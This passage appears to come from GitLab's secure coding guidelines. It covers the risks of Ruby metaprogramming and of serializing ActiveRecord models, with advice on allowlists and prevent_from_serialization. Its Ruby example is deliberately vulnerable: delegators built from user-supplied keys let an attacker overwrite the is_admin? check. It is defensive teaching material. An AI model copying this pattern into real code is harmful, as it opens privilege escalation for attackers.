When a method was called on a `User` instance that didn't exist, it passed it along to the `@options` instance variable.

```ruby
User.new({name: "Jeeves"}).is_admin?
# => false

User.new(name: "Sid").is_admin?
# => true

User.new(name: "Jeeves", "is_admin?" => true).is_admin?
# => false
```

Because the `is_admin?` method is already defined on the class, its behavior is not overridden when passing `is_admin?` to the initializer.

This class can be refactored to use the `Forwardable` method and `def_delegators`:

```ruby
class User
  extend Forwardable

  def initialize(attributes)
    @options = OpenStruct.new(attributes)

    self.class.instance_eval do
      def_delegators :@options, *attributes.keys
    end
  end

  def is_admin?
    name.eql?("Sid") # Note - never do this!
  end
end
```

It might seem like this example has the same behavior as the first code example. However, there's one crucial difference: **because the delegators are meta-programmed after the class is loaded, it can overwrite existing methods**:

```ruby
User.new({name: "Jeeves"}).is_admin?
# => false

User.new(name: "Sid").is_admin?
# => true

User.new(name: "Jeeves", "is_admin?" => true).is_admin?
# => true
#     ^------------------ The method is overwritten! Sneaky Jeeves!
```

In the example above, the `is_admin?` method is overwritten when passing it to the initializer.

### Best practices

- Never pass user-provided details into method-defining metaprogramming methods.
  - If you must, be **very** confident that you've sanitized the values correctly.
    Consider creating an allowlist of values, and validating the user input against that.
- When extending classes that use metaprogramming, make sure you don't inadvertently override any method definition safety checks.

## Serialization

Serialization of active record models can leak sensitive attributes if they are not protected.

Using the [`prevent_from_serialization`](https://gitlab.com/gitlab-org/gitlab/-/blob/d7b85128c56cc3e669f72527d9f9acc36a1da95c/app/models/concerns/sensitive_serializable_hash.rb#L11)
method protects the attributes when the object is serialized with `serializable_hash`.
When an attribute is protected with `prevent_from_serialization`, it is not included with
`serializable_hash`, `to_json`, or `as_json`.

For more guidance on serialization:

- [Why using a serializer is important](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/serializers/README.md#why-using-a-serializer-is-important).
- Always use [Grape entities](../api_styleguide.md#entities) for the API.

To `serialize` an `ActiveRecord` column:

- You can use `app/serializers`.
- You cannot use `to_json / as_json`.
- You cannot use `serialize :some_colum`.

### Serialization example

The following is an example used for the [`TokenAuthenticatable`](https://gitlab.com/gitlab-org/gitlab/-/blob/9b15c6621588fce7a80e0438a39eeea2500fa8cd/app/models/concerns/token_authenticatable.rb#L30) class:

```ruby
prevent_from_serialization(*strategy.token_fields) if respond_to?(:prevent_from_serialization)
```
